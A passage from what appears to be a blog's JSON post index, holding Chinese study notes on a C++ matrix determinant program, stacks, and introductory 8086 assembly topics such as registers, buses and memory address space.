a[N][N],int n)&#123; int i = 0, j = 0; double result, temp; double sub[N][N]; if (n == 1) &#123; result = a[0][0]; //if the matrix size == 1,result == the elements in matrix &#125; else if (n == 2) &#123; result = a[0][0] * a[1][1] - a[0][1] * a[1][0]; &#125; else &#123; result = 0.0; //make result back to zero for (j = 0; j &lt; n; j++) &#123; SubMatrix(a, sub, n, i, j); //reduce the size of matrix,namely,find the submatrix cout &lt;&lt; &quot;SubMatrix:\\n&quot;; PrintMatrix(sub, n - 1); //print the submatrix temp = DeterminantValue(sub, n - 1); //find the value of submatrix result += a[0][j] * pow(-1, i + j) * temp; //use submatrix and the corresponding elements in the first line in original matrix to find each value of items cout &lt;&lt; &quot;DValue of the Submatrix is &quot; &lt;&lt; fixed &lt;&lt; setprecision(1) &lt;&lt; temp &lt;&lt; endl; &#125; &#125; return result;&#125;int main()&#123; int n; //matrix size double a[N][N]; //matrix double result; cout &lt;&lt; &quot;Please enter matrix size n(1&lt;=n&lt;20)\\n&quot;; cin &gt;&gt; n; //input the matrix size n cout &lt;&lt; &quot;Please input matrix line by line:\\n&quot;; InputMatrix(a, n); //input the matrix PrintMatrix(a, n); //print the matrix result = DeterminantValue(a, n); ; //get the result of the matrix cout &lt;&lt; endl &lt;&lt; &quot;result is &quot; &lt;&lt; result; //print the result&#125;","categories":[{"name":"算法相关","slug":"算法相关","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"初步了解栈","slug":"初步了解栈","date":"2023-10-31T10:00:18.000Z","updated":"2023-11-15T03:19:02.434Z","comments":true,"path":"2023/10/31/初步了解栈/","link":"","permalink":"http://example.com/2023/10/31/%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3%E6%A0%88/","excerpt":"","text":"初步了解栈栈,存储货物或供旅客住宿的地方,可引申为仓库、中转站，所以引入到计算机领域里，就是指数据暂时存储的地方，所以才有进栈、出栈的说法。 栈是限制插入和删除只能在一个位置上进行的线性表。 至于什么是线性表，可以看另一篇文章：线性结构和非线性结构 这里的**”只能在一个位置上进行插入和删除”指的是栈顶，栈顶是会随着栈里面的数据元素的多少变化的，是动态变化的，一直指向栈的最上面一个数据元素。而既然有栈顶，那么就会有栈底，栈底的元素是不允许直接插入和删除的。** 看下图： &nbsp;左边的框框我们可以看成一个栈，右边是我们要存储的数据。然后我们往里面存储我们要存储的数据： 当我们把数据存放到栈里面时，叫进栈(也叫压栈) ,此时栈顶指向我们上面的”5”这个数据元素。 如果我们把栈顶的数据取出来，像下图这样，就是退栈（也叫出栈，弹栈） 如果再来一次弹栈，就是这样： 我们可以发现，我们每次弹栈都是最靠近栈顶（包括栈顶）的那个数据，而无法直接把下面的数据直接取出来。其实，这就是栈的一个特点：&nbsp;“先进后出，后进先出” 如果栈中没有数据，那么称之为空栈，空栈的时候不能向外取出数据，也就是不能退栈 如果栈中数据已满，则不能向内存入数据，也就是不能进栈 以上两种操作都会造成一定程度的问题，比如满栈的时候再次进栈，或者存入写入超过其本身长度的数据,以致于栈无法容纳，就会造成栈以外的存储单元被改写,称之为栈溢出。","categories":[{"name":"栈相关","slug":"栈相关","permalink":"http://example.com/categories/%E6%A0%88%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"汇编学习-2.3 几条汇编代码","slug":"汇编学习-2.3 几条汇编代码","date":"2023-10-31T09:58:27.000Z","updated":"2023-11-15T04:05:57.533Z","comments":true,"path":"2023/10/31/汇编学习-2.3 几条汇编代码/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2.3%20%E5%87%A0%E6%9D%A1%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/","excerpt":"","text":"2.3 几条汇编代码我们可以通过汇编指令来控制 CPU 进行工作，常用的指令如下表所示： **汇编指令****控制 CPU 完成的操作****用高级语言的语法描述**mov ax,18将 18 送入寄存器 axax=18mov ah,78将 78 送入寄存器 ahah=78add ax,8将寄存器 ax 中的数值加上 8ax+=8mov ax,bx将寄存器 bx 中的数据送入寄存器 axax=bxadd ax,bx将 ax 和 bx 中的数值相加，结果存在 ax 中ax+=bx注意：在写一条汇编指令或一个寄存器的名称的时候，不区分大小写 我们来看看实例 **程序段中的指令****指令执行后 ax 中的数据****指令执行后 bx 中的数据**mov ax,4E20h4E20h0000hadd ax,1406h6226h0000hmov bx,2000h6226h2000hadd ax,bx8226h2000hmov bx,ax8226h8226hadd ax,bx044Ch8226h注意：①原 ax，bx 中的值都为 0000h 我们都可以看到，最后得到的 ax 中的值是 044Ch（表格中涂上蓝色的），但是 ax + bx 的值不应该是 1044Ch 吗？为什么是 044Ch 呢？ 这是因为 ax 是一个 16 位寄存器，只能存放 4 个十六进制的数据，所以最高位的 1 不能在 ax 中保存，这样 ax 中的数据就是 044Ch 了。如果这是一个 32 位寄存器，那么就可以把 1044Ch 都保存进去 我们再来看一个实例： 程序段中的指令指令执行后 ax 中的数据指令执行后 bx 中的数据mov ax,001Ah001Ah0000hmov bx,0026h001Ah0026hadd al,bl0040h0026hadd ah,bl2640h0026hadd bh,al2640h4026hmov ah,00040h4026hadd al,85h00C5h4026hadd al,93h0058h4026h 我们可以看到，最后 ax 中的数据是 0058h，而不是 0158h，道理和上一个实例一样：al 是 ax 的低八位，也就是说它是一个 8 位寄存器，只能保存 2 个十六进制的数据，自然的那个 1 就不会被保存，最后的 ax 就是 0058h 需要注意的是：此时 al 是作为一个独立的 8 位寄存器来使用的，和 ah 没有关系，CPU 在执行这条指令时认为 ah 和 al 是两个不相关的寄存器。不要错误地认为，诸如 add al,93h的指令产生的进位会存储在 ah 中，add al,93h进行的是 8 位运算 还需要注意的是，在进行数据传送或运算时，要注意指令的两个操作对象的位数应当是一致的，比如说： ![](&#x2F;images&#x2F;汇编学习-2.3 几条汇编代码&#x2F;2image-8.png) 而下面的都是错误的 ![](&#x2F;images&#x2F;汇编学习-2.3 几条汇编代码&#x2F;image-9.png)","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"}],"tags":[]},{"title":"汇编学习-2.2 字在寄存器中的存储","slug":"汇编学习-2.2 字在寄存器中的存储","date":"2023-10-31T09:55:27.000Z","updated":"2023-10-31T10:18:24.784Z","comments":true,"path":"2023/10/31/汇编学习-2.2 字在寄存器中的存储/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2.2%20%E5%AD%97%E5%9C%A8%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8/","excerpt":"","text":"2.2 字在寄存器中的存储出于对兼容性的考虑，8086CPU 可以一次性处理两种尺寸的数据： 字节：记为 byte，一个字节由 8 个比特（即二进制位）组成，可以存在 8 位寄存器中 字：记为 word，一个字由两个字节组成，这两个字节分别称为这个字的高位字节和低位字节 ![一个字由两个字节组成](&#x2F;images&#x2F;汇编学习-2.2 字在寄存器中的存储&#x2F;2image-7.png) 一个字可以存在一个 16 位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高 8 位寄存器和低 8 位寄存器中 我们知道，十六位进制数的一位相当于二进制的四位，比如说 0100111000100000 可表示为：4(0010)、E(1110)、2(0010)、0(0000) 四位十六进制数 由于一个内存单元可存放 8 位数据，CPU 中的寄存器又可存放 n 个 8 位的数据。也就是说，计算机中的数据大多是由 1 ~ N 个 8 位数据构成的。很多时候，需要直观地看出组成数据的各个字节数据的值，用十六进制来表示数据可以直观地看出这个数据是由哪些8位数据构成的。比如 20000 写成 4E20 就可以直观地看出，这个数据是由 4E 和 20 两个 8 位数据构成的，如果 AX 中存放 4E20，那么 AH 里就是4E，AL 里就是20 而为了区分不同的进制，我们一般在十六进制表示的数据后面加 H，在二进制表示的数据后面加 B，十进制数后面什么都不加","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"}],"tags":[]},{"title":"汇编学习-2.1 通用寄存器","slug":"汇编学习-2.1 通用寄存器","date":"2023-10-31T09:54:27.000Z","updated":"2024-01-25T13:01:03.823Z","comments":true,"path":"2023/10/31/汇编学习-2.1 通用寄存器/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2.1%20%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/","excerpt":"","text":"2.1 通用寄存器8086CPU 的所有寄存器都是 16 位的，可以存放两个字节。AX、BX、CX、DX 四个寄存器通常用来存放一般性的数据，被称为通用寄存器 以 AX 为例： ![16 位寄存器的逻辑结构](&#x2F;images&#x2F;汇编学习-2.1 通用寄存器&#x2F;2image-2.png) 一个 16 位的寄存器可以存储一个 16 位的数据，数据在这类寄存器中的存放情况如下图 ![16 位数据在寄存器中的存储情况](&#x2F;images&#x2F;汇编学习-2.1 通用寄存器&#x2F;2image-4.png) 而一个 16 位寄存器可以被氛围两个 8 位寄存器，以 AX 为例就是 AH 和 AL： ![16 位寄存器分为两个 8 位寄存器](&#x2F;images&#x2F;汇编学习-2.1 通用寄存器&#x2F;image-5-1024x288.png) 可以看到，AX 的低 8 位，也就是 0 ~ 7 位构成了 AL 寄存器；AX 的高 8 位，也就是 8 ~ 15 位构成了 AH 寄存器。需要知道的是，AH 和 AL 寄存器是可以独立使用的 8 位寄存器 ![16 位寄存器及所分成的两个 8 位寄存器的数据存储情况](&#x2F;images&#x2F;汇编学习-2.1 通用寄存器&#x2F;2image-6.png) 接下来有两个问题： 问题一：一个16位寄存器所能存储的数据的最大值为多少? 答：216 &#x3D; 65536，则 16 位寄存器能存储的数据的最大值为 216 - 1 &#x3D; 65535 问题二：一个8位寄存器所能存储的数据的最大值为多少? 答：28 &#x3D; 256，则 8 位寄存器能存储的数据的最大值为 216 - 1 &#x3D; 255","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"}],"tags":[]},{"title":"汇编学习-2.0 寄存器（CPU 工作原理）","slug":"汇编学习-2.0 寄存器（CPU 工作原理）","date":"2023-10-31T09:52:27.000Z","updated":"2024-01-25T13:01:07.242Z","comments":true,"path":"2023/10/31/汇编学习-2.0 寄存器（CPU 工作原理）/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2.0%20%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU%20%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/","excerpt":"","text":"2.0 寄存器（CPU 工作原理）一个典型的 CPU （此处，我们讨论的不是某一具体的 CPU）由运算器、控制器、寄存器等器件构成，这些器件靠内部总线相连。前面所说的总线，相对于 CPU 内部来说是外部总线。内部总线实现 CPU 内部各个器件之间的联系，外部总线实现 CPU 和主板上其他器件的联系。简单地说，在 CPU 中，运算器进行信息处理；寄存器进行信息存储；控制器控制各种器件进行工作；内部总线连接各种器件，在它们之间进行数据的传送。 对汇编学习来说，CPU 中最主要的部件就是寄存器。寄存器是 CPU 中程序员可以用指令读写的部件。程序员可以通过改变各种寄存器中的内容来实现对 CPU 的控制 不同的 CPU，寄存器的个数、结构是不相同的。8086CPU 有14个寄存器，每个寄存器有一个名称。这些寄存器是：AX, BX, CX, DX, SI, DI, SP, BP, IP, CS, SS, DS, ES, PSW","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"}],"tags":[]},{"title":"汇编学习-1.9 内存地址空间","slug":"汇编学习-1.9 内存地址空间","date":"2023-10-31T09:50:27.000Z","updated":"2024-01-25T13:01:11.458Z","comments":true,"path":"2023/10/31/汇编学习-1.9 内存地址空间/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.9%20%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/","excerpt":"","text":"1.9 内存地址空间什么是内存地址空间呢？ 我们来简单了解一下内存地址空间。举例来讲，一个 CPU 的地址线宽度为 10，那么可以寻址 1024 个内存单元，这 1024 个可寻的内存单元就构成了这个 CPU 的内存地址空间（210 &#x3D; 1024） 先前说到的那些存储器，它们再物理上是独立的器件，但是它们在以下两点上的相同： 都和 CPU 总线相连 CPU 对它们的读与写的时候都通过控制线发出内存读写命令 这也就是说，CPU 在操纵和控制它们的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是我们所说的内存地址空间 ![](&#x2F;images&#x2F;汇编学习-1.9 内存地址空间&#x2F;2image.png)CPU 将系统中各类存储器看作一个逻辑存储器 在上图中，所有的物理存储器都被看作一个由若干个存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。CPU 在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读取数据 我们来看一个例子： ![](&#x2F;images&#x2F;汇编学习-1.9 内存地址空间&#x2F;image-1024x402.png) 内存地址空间的大小受 CPU 地址总线宽度的限制。8086CPU 的地址总线宽度为 20，可以传送 220 个不同的地址信息（大小从 0 至 220-1）。即可以定位 220 个内存单元，则 8086CPU 的内存地址空间大小为 1 MB（216 &#x3D; 64 * 1024B &#x3D; 64KB，220 &#x3D; 1024KB &#x3D; 1 MB）。同理，80386CPU 的地址总线宽度为 32，则内存地址空间最大为 4GB。 我们在基于一个计算机硬件系统编程的时候，必须得知道这个系统中的内存地址空间分配情况。因为当读者想在某类存储器中读写数据的时候，读者必须知道它的第一个单元的地址和最后一个单元的地址，才能保证读写操作是在预期的存储器中进行。比如，读者希望向显示器输出一段信息，那么读者必须将这段信息写到显存中，显卡才能将它输出到显示器上。要向显存中写入数据，读者必须知道显存在内存地址空间中的地址。而不同的计算机系统的内存地址空间的分配情况是不同的。","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.8 各类存储器芯片","slug":"汇编学习-1.8 各类存储器芯片","date":"2023-10-31T09:49:27.000Z","updated":"2024-01-25T13:01:14.686Z","comments":true,"path":"2023/10/31/汇编学习-1.8 各类存储器芯片/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.8%20%E5%90%84%E7%B1%BB%E5%AD%98%E5%82%A8%E5%99%A8%E8%8A%AF%E7%89%87/","excerpt":"","text":"1.8 各类存储器芯片一台 PC 机中，装有多个存储器芯片，这些存储器芯片从物理连接上看是独立的、不同的器件。 不过从读写属性上看的话，就只分为 2 种：随机存储器（RAM）和 只读存储器（ROM）。随机存储器可读可写，但必须带电存储，关机后存储的内容会丢失；只读存储器顾名思义，只能读、不能写，不过与随机存储器不同的是，关机后其中的内容是不会丢失的。 如果是从功能与连接上分类的话，就分为 3 类： 随机存储器 用于存放供 CPU 使用的绝大部分程序和数据，主随机存储器一般由两个位置上的 RAM 组成，装在主板上的 RAM 与 插在扩展插槽上的 RAM（注意这不是接口卡上的，是扩展插槽上的） BIOS，即 Basic Input&#x2F;Output System，基本输入&#x2F;输出系统。BIOS 是由主板和各类接口卡厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插有存储相应 BIOS 的 RAM。比如说，主板上的 ROM 存储着主板的 BIOS（通常称为系统 BIOS）；显卡上的 ROM 存储着显卡的 BIOS；如果网卡上装有 ROM，那其中就可以存储网卡的 BIOS接口卡上的 RAM 某些接口卡需要对大批量输入、输出数据进行暂时存储，在其上装有 RAM。最典型的就是显示卡上的 RAM，我们一般把它称为 显存。显示卡随时将显存中的数据向显示器上输出。换句话说，我们将需要显示的内容写入显存，就会出现在显示器上。","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.7 主板与接口卡","slug":"汇编学习-1.7 主板与接口卡","date":"2023-10-31T09:48:27.000Z","updated":"2024-01-25T13:01:18.050Z","comments":true,"path":"2023/10/31/汇编学习-1.7 主板与接口卡/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.7%20%E4%B8%BB%E6%9D%BF%E4%B8%8E%E6%8E%A5%E5%8F%A3%E5%8D%A1/","excerpt":"","text":"1.7 主板与接口卡1.7.1 主板在每一台 PC 机中，都有一块主板，主板上有核心器件和一些主要器件，这些器件通过总线（地址总线、数据总线、控制总线）相连，而这些器件就有：CPU，存储器，外围芯片组，扩展插槽（扩展插槽上一般插有 RAM 内存条和各类接口卡）等。 1.7.2 接口卡计算机系统中，所有可用程序控制其工作的设备，都必须收到 CPU 的控制，但是外部设备是不能由 CPU 直接控制的，比如说音响、显示器、打印机、话筒等。那么是什么直接控制这些外部设备的呢？ 没错，就是接口卡，不过准确的说是 插在扩展插槽上的接口卡。而扩展插槽与 CPU 通过总线相连，所以接口卡也通过总线与 CPU 相连。CPU 可以通过总线直接控制接口卡，从而实现 CPU 对这些外部设备的间接控制。","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.6 总线","slug":"汇编学习-1.6 总线","date":"2023-10-31T09:47:27.000Z","updated":"2024-01-25T13:01:21.094Z","comments":true,"path":"2023/10/31/汇编学习-1.6 总线/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.6%20%E6%80%BB%E7%BA%BF/","excerpt":"","text":"1.6 总线1.6.1 地址总线CPU 是通过地址总线来指定存储器单元的，地址总线上能够传送多少个不同的信息，CPU 就能对多少个存储单元进行寻址 在电子计算机中，一根导线可以传送的稳定状态只有两种，高电平和低电平；用二进制来表示的话，就是我们熟悉的 1 和 0，所以如果有 10 根导线的话，就可以传送 10 位二进制数据，而 10 位二进制数据可以表示 210 种数据，最小可以表示 0，最大可以表示 1023 所以，我们就有了宽度的概念：一个 CPU 有 N 跟地址总线，那么这个 CPU 的地址总线的宽度就是 N，这样的 CPU 最多可以寻找 2N 个内存单元 1.6.2 数据总线CPU 与内存或其他器件之间的数据传送是通过数据总线来进行的，数据总线的宽度决定了 CPU 和外界的数据传送速度。8 根数据总线能够一次性传送 8 位二进制数据（也就是一个字节），16 根数据总线一次可以传送 2 个字节 如果一个占 2 个字节的数据要写入内存的话，宽度为 8 和宽度为 16 的会有什么区别呢？ 8086 有 16 根数据线，可以一次传送 16 位数据，所以可以一次性传送数据 89D8H；而 8088 只有 8 根数据线，一次只能传 8 位数据，所以向内存写入 89D8H 的时候需要传送两次 1.6.3 控制总线CPU 对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味这 CPU 提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU对外部器件的控制能力。 前面所讲的内存读或写命令是由几根控制线综合发出的，其中有一根控制线，叫作 读信号输出控制线，负责由 CPU 向外传送读信号，如果 CPU 向该控制线上输出低电平，就表示将要读取数据；有一根控制线，叫作 写信号输出控制线，是负责传送写信号的","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.5 CPU 对存储器的读写","slug":"汇编学习-1.5 CPU 对存储器的读写","date":"2023-10-31T09:45:27.000Z","updated":"2023-10-31T10:17:36.772Z","comments":true,"path":"2023/10/31/汇编学习-1.5 CPU 对存储器的读写/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.5%20CPU%20%E5%AF%B9%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E8%AF%BB%E5%86%99/","excerpt":"","text":"1.5 CPU 对存储器的读写之前讲到过，存储器被划分为多个存储单元，存储单元从零开始顺序编号。这些编号呢，我们可以把它看作是存储单元在存储器中的地址。就像是一条街，每门每户都有属于它们自己的门牌号。 CPU 要从内存中读数据，首先要指定存储单元的地址。也就是说它要先确定读取哪一个存储单元中的数据，就像是你要找一个人，先要确定那个人是哪户的。 另外，在一台微机中，不只有存储器这一种器件。CPU 在读写数据的时候还要指明，它要对哪种器件进行操作，还有要进行什么操作，是从中读取数据，还是要写入数据进去。 所以说我们可以看到，CPU 想要进行数据的读写，必须和外部器件（标准的说法就是芯片）进行 3 类信息的交互： 存储单元的地址 （地址信息） 器件的选择，读或写的命令 （控制信息） 读或写的数据 （数据信息） 那么 CPU 是通过什么将地址、数据和控制信息传到存储器芯片中的呢？首先，我们要知道的是，电子计算机能处理、传输的信息都是电信号；然后，电信号当然要用导线传送，在计算机中专门有连接 CPU 和其他芯片的导线，通常称之为总线。也就是一根根导线的集合。我们上面说到了 3 类信息的交互，所以总线也会被分为三类，也就是 地址总线、控制总线和数据总线 我们来看看《汇编语言》- 王爽 中 “CPU 从内存中读取和写入数据的过程” 的例子 ![](&#x2F;images&#x2F;汇编学习-1.5 CPU 对存储器的读写&#x2F;image-1024x849.png) 这样我们就对 CPU 从内存中读取和写入数据的过程了解清楚了，接下来就要来了解，我们要怎么命令计算机进行数据的读写 要让一个计算机或微处理器工作，应向它输入能够驱动它工作的电平信号，也就是我们说的机器码 之后会详细说明机器码","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.4存储器与存储单元","slug":"汇编学习-1.4 存储器与存储单元","date":"2023-10-31T09:43:27.000Z","updated":"2023-10-31T10:17:31.259Z","comments":true,"path":"2023/10/31/汇编学习-1.4 存储器与存储单元/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.4%20%E5%AD%98%E5%82%A8%E5%99%A8%E4%B8%8E%E5%AD%98%E5%82%A8%E5%8D%95%E5%85%83/","excerpt":"","text":"1.4 存储器与存储单元CPU 是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据。指令和数据在存储器中存放，也就是平时所说的内存。在一台PC机中内存的作用仅次于CPU。离开了内存，性能再好的CPU也无法工作。这就像再聪明的大脑，没有了记忆也无法进行思考。磁盘不同于内存，磁盘上的数据或程序如果不读到内存中，就无法被CPU使用。要灵活地利用汇编语言编程，首先要了解CPU是如何从内存中读取信息，以及向内存中写入信息的。 ![](&#x2F;images&#x2F;汇编学习-1.4 存储器与存储单元&#x2F;image-3.png) 存储器被划分成若干个存储单元，每个存储单元从 0 开始顺序编号，例如一个存储器有 128 个存储单元，编号从 0~127 &#x3D;一个存储单元能存储多少信息呢？电子计算机的最小信息单位是 bit (音译为比特)，也就是一个二进制位。8 个 bit 组成一个 Byte，也就是一个字节。微型机存储器的存储单元可以存储一个字节,即 8 个二进制位。一个存储器有 128 个存储单元，它可以存储 128 个字节 微机存储器的容量是以字节为最小单位来计算的。对于拥有 128 个存储单元的存储器，我们可以说，它的容量是 128 字节 对于大容量的的存储器一般还用以下单位来计算容量（其中 B 用来代表 Byte 也就是一字节）： 1 KB &#x3D; 1024 B 1 MB &#x3D; 1024 KB 1 GB &#x3D; 1024 MB 1 TB &#x3D; 1024 GB 磁盘的容量单位和内存是一样的，实际上以上单位是微机中的常用的计量单位","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.3汇编语言的组成以及指令和数据","slug":"汇编学习-1.3 汇编语言的组成以及指令和数据","date":"2023-10-31T09:41:27.000Z","updated":"2024-01-25T13:01:35.363Z","comments":true,"path":"2023/10/31/汇编学习-1.3 汇编语言的组成以及指令和数据/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.3%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9A%84%E7%BB%84%E6%88%90%E4%BB%A5%E5%8F%8A%E6%8C%87%E4%BB%A4%E5%92%8C%E6%95%B0%E6%8D%AE/","excerpt":"","text":"1.3 汇编语言的组成以及指令和数据1.3.1 汇编语言的组成汇编语言由以下三类指令组成： 汇编指令：机器码的助记符，由对应的机器码 伪指令： 没有对应的机器码，由编译器执行，计算机并不执行 其他符号：如 + 、- 、* 、&#x2F; 等，由编译器识别，没有对应的机器码 汇编语言的核心是汇编指令，它决定了汇编语言的特性。 1.3.2 指令和数据指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。CPU 在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。 《汇编语言》- 王爽 中有个有趣的例子： 内存中的二进制信息 1000100111011000 计算机可以把它看作大小为 89D8H 的数据来处理，也可以看作指令 mov ax,bx 来执行1000100111011000 → 89D8H （数据）1000100111011000 → mov ax,bx （程序）","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.2汇编语言的诞生","slug":"汇编学习-1.2 